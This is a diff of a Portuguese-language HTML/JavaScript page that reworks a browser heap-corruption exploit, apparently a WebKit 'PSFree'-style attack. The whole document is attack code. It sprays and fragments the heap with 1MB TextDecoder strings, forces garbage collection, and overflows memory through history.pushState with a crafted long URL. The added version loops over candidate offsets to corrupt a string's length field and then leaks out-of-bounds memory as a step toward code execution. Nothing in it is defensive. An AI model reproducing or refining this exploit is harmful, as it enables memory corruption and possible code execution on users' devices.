@@ -1,31 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PSFree Logic: Decoder Clash</title>
+    <title>RCE Tuner: Length Corruption</title>
     <style>
-        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; }
-        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #ff0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
+        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; animation: blink 1s infinite; }
+        @keyframes blink { 50% { border-color: red; } }
     </style>
 </head>
 <body>
 
-    <h1>Técnica Final: Decoder Clash</h1>
-    <p>Alinhando Size Classes usando TextDecoder para Strings de 1MB.</p>
+    <h1>RCE Tuner: Buscando o "Length"</h1>
+    <p>Você acertou os DADOS em 709.520. Agora vamos recuar para acertar o CABEÇALHO.</p>
 
-    <button onclick="startDecoderAttack()">INICIAR ALINHAMENTO PERFEITO</button>
+    <button onclick="startTuning()">INICIAR SINTONIA FINA</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        // O Offset que descobrimos (Header Boundary)
-        const BASE_OFFSET = 709520; 
+        // O ponto onde acertamos os dados (Sucesso anterior)
+        const DATA_HIT_OFFSET = 709520;
         const OVERFLOW_AMT = 1024 * 64; 
 
-        // ALINHAMENTO DE CLASSE DE TAMANHO (O Segredo)
-        // O pushState aloca ~1MB. Precisamos de vítimas de ~1MB.
-        // JS Strings têm um header de aprox 24 bytes.
+        // Configuração da Vítima (1MB TextDecoder - O que funcionou)
         const TARGET_SIZE = 1024 * 1024; 
         const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
@@ -38,95 +37,101 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startDecoderAttack() {
-            log(`Criando vítimas de 1MB usando TextDecoder (8-bit force)...`);
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-            // 1. Preparar o Buffer de origem
-            // Enchemos de 'B' (0x42)
-            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-            rawBuffer.fill(0x42);
-            
-            // TextDecoder força a criação de uma string Flat de 8 bits
-            // Isso imita o comportamento de memória do pushState
-            let decoder = new TextDecoder("utf-8");
-            let baseString = decoder.decode(rawBuffer);
+        async function startTuning() {
+            // Vamos testar recuando de 4 em 4 bytes
+            // Offsets: -4, -8, -12, -16, -20, -24
+            const OFFSETS_TO_TRY = [4, 8, 12, 16, 20, 24, 28, 32];
 
-            // 2. SPRAY (Encher o Large Heap)
-            // Não precisamos de muitos, pois são gigantes
-            const SPRAY_COUNT = 80; 
-            
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                // Adiciona um prefixo único para impedir que o WebKit deduplique as strings
-                // (Se as strings forem iguais, ele aponta todas para a mesma memória)
-                let s = i + "_" + baseString.substring((i+"_").length);
-                victims.push(s);
-            }
-
-            // 3. BURACOS (Feng Shui)
-            log("Abrindo buracos no Large Heap...");
-            for(let i=0; i<SPRAY_COUNT; i+=2) {
-                victims[i] = null;
-            }
-
-            // Força GC pesado
-            await forceGC();
-
-            // 4. EXPLOIT
-            log("Disparando Overflow (Tentando ocupar o buraco)...");
-            setTimeout(() => {
-                try {
-                    let buffer = "A".repeat(BASE_OFFSET);
-                    buffer += "\x01".repeat(OVERFLOW_AMT);
-                    
-                    history.pushState({}, "pwn", "/" + buffer);
-
-                    log("Verificando corrupção...");
-                    checkVictims(PAYLOAD_SIZE);
-
-                } catch (e) {
-                    log("Erro: " + e.message);
+            for (let sub of OFFSETS_TO_TRY) {
+                let currentOffset = DATA_HIT_OFFSET - sub;
+                
+                log(`------------------------------------------`);
+                log(`TESTANDO OFFSET: ${currentOffset} (Base - ${sub})`);
+                
+                let result = await runAttempt(currentOffset);
+                
+                if (result) {
+                    return; // Paramos se acharmos o ouro
                 }
-            }, 500);
+                
+                // Limpeza agressiva entre tentativas
+                victims = null;
+                await forceGC();
+                await sleep(200);
+            }
+            log("Fim da sintonia. Tente reiniciar e rodar de novo.");
         }
 
-        function checkVictims(expectedLen) {
-            let success = false;
-            for(let i=1; i<victims.length; i+=2) {
-                let s = victims[i];
-                if(!s) continue;
+        async function runAttempt(offset) {
+            try {
+                // 1. Preparar Buffer (1MB Flat String)
+                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
+                rawBuffer.fill(0x42); // 'B'
+                let decoder = new TextDecoder("utf-8");
+                let baseString = decoder.decode(rawBuffer);
 
-                // TRUQUE DO PSFREE: Usar Error para ler
-                try {
-                    let err = new Error(s);
-                    let msg = err.message;
-
-                    // Checa Tamanho
-                    if (msg.length !== expectedLen) {
-                        log(`!!! SUCESSO (LENGTH) !!! String ${i}`, 'win');
-                        log(`Novo Tamanho: ${msg.length}`);
-                        alert("RCE STEP 1: LENGTH CORRUPTED!");
-                        success = true;
-                        break;
-                    }
-
-                    // Checa Conteúdo (Byte 0x01)
-                    if (msg.charCodeAt(0) !== 66) { // 66 = 'B'
-                        log(`!!! SUCESSO (CONTENT) !!! String ${i} sobrescrita!`, 'win');
-                        alert("RCE STEP 1: DATA CORRUPTED!");
-                        success = true;
-                        break;
-                    }
-                } catch(e) {
-                    // Se der erro ao ler, pode ser um bom sinal (ponteiro inválido)
-                    log(`Erro ao ler vítima ${i}: ${e.message}`);
+                // 2. Spray
+                victims = [];
+                for(let i=0; i<60; i++) {
+                    let s = i + "_" + baseString.substring((i+"_").length);
+                    victims.push(s);
                 }
+
+                // 3. Buracos
+                for(let i=0; i<60; i+=2) victims[i] = null;
+                await forceGC();
+
+                // 4. Exploit com Offset Ajustado
+                let buffer = "A".repeat(offset);
+                buffer += "\x01".repeat(OVERFLOW_AMT);
+                
+                history.pushState({}, "tune_" + offset, "/" + buffer);
+
+                // 5. Checagem
+                for(let i=1; i<victims.length; i+=2) {
+                    let s = victims[i];
+                    if(!s) continue;
+
+                    // TRUQUE DO ERROR (Essencial para ler o Length real do Heap)
+                    try {
+                        let err = new Error(s);
+                        let msg = err.message;
+
+                        // SUCESSO SUPREMO: Tamanho mudou?
+                        if (msg.length !== PAYLOAD_SIZE) {
+                            log(`!!! JACKPOT !!! LENGTH CORROMPIDO!`, 'win');
+                            log(`Offset Mágico: ${offset} (Base - ${DATA_HIT_OFFSET - offset})`, 'win');
+                            log(`Novo Tamanho: ${msg.length}`);
+                            
+                            // Prova de Leitura OOB (Out of Bounds)
+                            // Lendo memória que não nos pertence
+                            let leak = msg.charCodeAt(PAYLOAD_SIZE + 100);
+                            log(`Byte vazado do vizinho (+100): 0x${leak.toString(16)}`, 'win');
+                            
+                            alert("RCE UNLOCKED: MEMORY LEAK & WRITE!");
+                            return true;
+                        }
+                        
+                        // Ainda só dados?
+                        if (msg.charCodeAt(0) === 1) {
+                            log(`Aviso: Ainda acertando apenas DADOS em -${DATA_HIT_OFFSET - offset}. Precisa recuar mais.`);
+                            return false; // Continua tentando recuar
+                        }
+
+                    } catch(e) {}
+                }
+
+            } catch(e) {
+                log("Erro (OOM): " + e.message);
             }
-            if(!success) log("Nenhuma string atingida. Isolamento persiste.");
+            return false;
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 800));
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
